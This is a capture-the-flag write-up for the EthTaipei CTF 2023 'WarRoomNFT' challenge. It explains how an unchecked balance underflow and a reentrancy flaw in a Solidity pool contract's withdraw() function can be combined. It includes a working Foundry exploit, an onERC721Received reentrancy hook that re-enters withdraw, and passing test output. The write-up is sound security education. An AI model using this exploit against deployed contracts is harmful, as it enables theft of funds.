# EthTaipei CTF 2023 - ETHTaipeiWarRoomNFT
- Scope  
    - NFT.sol  
    - Pool.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

### Vulnerability Details
1. The contract uses 0.7.0 which is susceptible to integer underflow
2. The `withdraw()` function does not use the 'Checks-Effects-Interaction', and allowing reentrancy.
```diff
-1 pragma solidity ^0.7.0;

function withdraw(uint256 tokenId) external {
        require(_userDeposits[msg.sender][tokenId], "Should be owner.");
        require(_balances[msg.sender] > 0, "Should have balance.");

-2        IERC721(NFTCollateral).safeTransferFrom(address(this), msg.sender, tokenId);
-2        _balances[msg.sender] -= 1 ether;
        delete _userDeposits[msg.sender][tokenId];
    }
```

### Impact/Proof of Concept
1. approve NFT
2. deposit NFT
3. withdraw = From 1 ether become 0 ether
4. onERC721Received() - transfer NFT over without using deposit
5. onERC721Received() - withdraw again = From 0 ether become 2^256 − 1 ether
```diff
bool done = false;

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external override returns (bytes4) {
        pool = base.pool();
        nft = base.nft();
        // Include a boolean so that it perform once
        
        
        if(!done){
            done = true;
            nft.transferFrom(address(this), address(pool), 1);
            pool.withdraw(1);
        }
        
        return IERC721Receiver.onERC721Received.selector;
    }
    
    function test_Exploit() public {
        pool = base.pool();
        nft = base.nft();
        console.log("isSolved: ", pool.isSolved(address(this)));
        nft.approve(address(pool), 1);
        pool.deposit(1);
        pool.withdraw(1);
        console.log("isSolved: ", pool.isSolved(address(this)));
    }
```
Results:
```diff
[PASS] test_Exploit() (gas: 319319)
Logs:
  isSolved:  false
  isSolved:  true
```
